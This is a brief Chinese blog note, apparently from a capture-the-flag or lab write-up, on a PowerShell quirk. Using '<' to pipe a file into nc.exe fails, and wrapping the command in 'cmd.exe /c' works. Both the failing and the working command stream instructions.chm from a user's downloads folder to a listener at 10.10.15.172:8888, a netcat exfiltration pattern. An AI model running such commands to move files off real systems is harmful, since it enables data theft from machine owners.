<h1 id="windows下使用nc传输文件"><a href="#windows下使用nc传输文件" class="headerlink" title="windows下使用nc传输文件"></a>windows下使用nc传输文件</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Chris\downloads&gt; C:\tmp\nc.exe 10.10.15.172 8888 &lt; instructions.chm </span><br><span class="line">c;CC:\tmp\nc.exe 10.10.15.172 8888 &lt; instructions.chm </span><br><span class="line">At line:1 char:37</span><br><span class="line">+ c;CC:\tmp\nc.exe 10.10.15.172 8888 &lt; instructions.chm</span><br><span class="line">+                                     ~</span><br><span class="line">The &#39;&lt;&#39; operator is reserved for future use.</span><br><span class="line">    + CategoryInfo          : ParserError: (:) [], ParentContainsErrorRecordException</span><br><span class="line">    + FullyQualifiedErrorId : RedirectionNotSupported</span><br></pre></td></tr></table></figure>
<h2 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PS C:\Users\Chris\downloads&gt; &amp; cmd.exe &#x2F;c &quot;C:\tmp\nc.exe 10.10.15.172 8888 &lt; instructions.chm &quot;</span><br></pre></td></tr></table></figure>

]]></content>
  </entry>
</search>
